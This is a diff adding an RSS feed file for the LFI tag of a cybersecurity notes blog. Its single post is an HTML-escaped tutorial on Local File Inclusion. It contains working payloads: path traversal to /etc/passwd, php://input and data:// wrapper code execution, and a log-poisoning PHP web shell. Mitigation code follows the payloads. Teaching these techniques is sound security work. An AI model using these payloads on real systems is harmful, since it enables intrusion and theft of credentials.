@@ -1,0 +1,119 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>LFI on Istark Cybersecurity Notes</title>
+        <link>http://localhost:33837/tags/lfi/</link>
+        <description>Recent content in LFI on Istark Cybersecurity Notes</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>en-us</language>
+        <lastBuildDate>Thu, 04 Apr 2024 15:30:00 +0200</lastBuildDate><atom:link href="http://localhost:33837/tags/lfi/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>LFI (Local File Inclusion) Exploitation</title>
+        <link>http://localhost:33837/posts/web-security/lfi-exploitation/</link>
+        <pubDate>Thu, 04 Apr 2024 15:30:00 +0200</pubDate>
+        
+        <guid>http://localhost:33837/posts/web-security/lfi-exploitation/</guid>
+        <description>&lt;h1 id=&#34;lfi-local-file-inclusion-exploitation&#34;&gt;LFI (Local File Inclusion) Exploitation
+&lt;/h1&gt;&lt;h2 id=&#34;what-is-lfi&#34;&gt;What is LFI?
+&lt;/h2&gt;&lt;p&gt;Local File Inclusion (LFI) is a vulnerability that allows an attacker to include files on a server through the web browser. This vulnerability occurs when a web application includes a file without properly sanitizing the input, allowing an attacker to manipulate the parameter and include arbitrary files from the server.&lt;/p&gt;
+&lt;h2 id=&#34;common-vulnerable-code-patterns&#34;&gt;Common Vulnerable Code Patterns
+&lt;/h2&gt;&lt;p&gt;In PHP:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;include&lt;/span&gt;($_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;page&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;.php&amp;#39;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In this example, if an attacker sets &lt;code&gt;?page=../../../etc/passwd%00&lt;/code&gt;, they might be able to read the &lt;code&gt;/etc/passwd&lt;/code&gt; file.&lt;/p&gt;
+&lt;h2 id=&#34;basic-lfi-techniques&#34;&gt;Basic LFI Techniques
+&lt;/h2&gt;&lt;h3 id=&#34;path-traversal&#34;&gt;Path Traversal
+&lt;/h3&gt;&lt;p&gt;The most common technique is using directory traversal sequences (&lt;code&gt;../&lt;/code&gt;) to navigate to sensitive files:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;http://example.com/index.php?page=../../../etc/passwd
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;common-target-files&#34;&gt;Common Target Files
+&lt;/h3&gt;&lt;p&gt;Linux:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;/etc/passwd&lt;/code&gt; - User accounts information&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;/etc/shadow&lt;/code&gt; - Password hashes (usually requires privileges)&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;/etc/hosts&lt;/code&gt; - Host name resolution&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;/proc/self/environ&lt;/code&gt; - Environment variables&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;/var/log/apache2/access.log&lt;/code&gt; - Web server logs&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;/var/www/html/config.php&lt;/code&gt; - Web application configurations&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Windows:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;C:/Windows/System32/drivers/etc/hosts&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;C:/Windows/win.ini&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;C:/xampp/apache/logs/access.log&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;C:/xampp/apache/logs/error.log&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;advanced-exploitation-techniques&#34;&gt;Advanced Exploitation Techniques
+&lt;/h2&gt;&lt;h3 id=&#34;php-wrappers&#34;&gt;PHP Wrappers
+&lt;/h3&gt;&lt;p&gt;PHP provides various wrappers that can be used to exploit LFI vulnerabilities:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;php://filter&lt;/strong&gt;: Read PHP source code without executing it&lt;/li&gt;
+&lt;/ol&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;http://example.com/index.php?page=php://filter/convert.base64-encode/resource=config
+&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;
+&lt;li&gt;&lt;strong&gt;php://input&lt;/strong&gt;: Use POST data as code&lt;/li&gt;
+&lt;/ol&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;http://example.com/index.php?page=php://input
+[POST data: &amp;lt;?php system(&amp;#34;whoami&amp;#34;); ?&amp;gt;]
+&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;3&#34;&gt;
+&lt;li&gt;&lt;strong&gt;data://&lt;/strong&gt;: Execute code directly&lt;/li&gt;
+&lt;/ol&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;http://example.com/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCJscyIpOyA/Pg==
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;log-poisoning&#34;&gt;Log Poisoning
+&lt;/h3&gt;&lt;p&gt;This technique involves injecting PHP code into log files and then including those files:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Send a request with PHP code in the User-Agent header:&lt;/li&gt;
+&lt;/ol&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;?php system($_GET[&amp;#39;cmd&amp;#39;]); ?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;
+&lt;li&gt;Include the log file:&lt;/li&gt;
+&lt;/ol&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;http://example.com/index.php?page=../../../var/log/apache2/access.log&amp;amp;cmd=whoami
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;mitigation-strategies&#34;&gt;Mitigation Strategies
+&lt;/h2&gt;&lt;p&gt;To prevent LFI vulnerabilities:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;Whitelist Approach&lt;/strong&gt;: Only allow known good values&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    $allowed_pages &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;home&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;about&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;contact&amp;#39;&lt;/span&gt;];
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    $page &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;page&amp;#39;&lt;/span&gt;];
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;in_array&lt;/span&gt;($page, $allowed_pages)) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;include&lt;/span&gt;($page &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;.php&amp;#39;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;include&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;home.php&amp;#39;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ol start=&#34;2&#34;&gt;
+&lt;li&gt;&lt;strong&gt;File Path Sanitization&lt;/strong&gt;: Remove or encode dangerous characters&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Disable allow_url_include&lt;/strong&gt;: Set to Off in php.ini&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Use Security Functions&lt;/strong&gt;: &lt;code&gt;basename()&lt;/code&gt; to extract the filename part&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Web Application Firewall (WAF)&lt;/strong&gt;: Implement rules to detect path traversal&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;lfi-to-rce-remote-code-execution&#34;&gt;LFI to RCE (Remote Code Execution)
+&lt;/h2&gt;&lt;p&gt;In some cases, LFI can be escalated to achieve remote code execution:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Log poisoning&lt;/li&gt;
+&lt;li&gt;Session poisoning&lt;/li&gt;
+&lt;li&gt;/proc/self/environ exploitation&lt;/li&gt;
+&lt;li&gt;Uploaded file inclusion&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;tools-for-lfi-testing&#34;&gt;Tools for LFI Testing
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;LFISuite: &lt;a class=&#34;link&#34; href=&#34;https://github.com/D35m0nd142/LFISuite&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://github.com/D35m0nd142/LFISuite&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Kadimus: &lt;a class=&#34;link&#34; href=&#34;https://github.com/P0cL4bs/Kadimus&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://github.com/P0cL4bs/Kadimus&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;LFI-Enum: &lt;a class=&#34;link&#34; href=&#34;https://github.com/flast101/php-lfi-payload-generator&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://github.com/flast101/php-lfi-payload-generator&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;references&#34;&gt;References
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;OWASP: &lt;a class=&#34;link&#34; href=&#34;https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;HackTricks: &lt;a class=&#34;link&#34; href=&#34;https://book.hacktricks.xyz/pentesting-web/file-inclusion&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://book.hacktricks.xyz/pentesting-web/file-inclusion&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+        </item>
+        
+    </channel>
+</rss>
